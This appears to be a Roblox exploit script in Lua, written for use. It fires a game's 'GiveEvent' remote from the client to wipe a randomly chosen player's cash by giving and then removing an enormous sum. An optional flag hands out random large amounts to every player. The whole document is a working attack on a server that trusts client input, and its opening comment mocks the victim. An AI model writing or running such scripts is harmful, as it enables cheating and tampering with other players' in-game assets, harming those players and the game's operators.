--lol, btw it resets a random person's cash so you can have 100q, you greedy bastard
local giveeveryonecash = false

function givemoney(plr, amount)
    local args = {
        [1] = plr,
        [2] = amount
    }
    game:GetService("ReplicatedStorage").GiveEvent:FireServer(unpack(args))
end

local randomPlayer = game.Players:GetChildren()[math.random(1,#game.Players:GetChildren())]
givemoney(randomPlayer, 99999999999999999)
givemoney(randomPlayer, -99999999999999999)

if giveeveryonecash then
    for i,v in pairs(game.Players:GetChildren()) do
        local args = {
            [1] = v,
            [2] = math.random(10000000, 500000000)
        }
        
        game:GetService("ReplicatedStorage").GiveEvent:FireServer(unpack(args))
    end
end
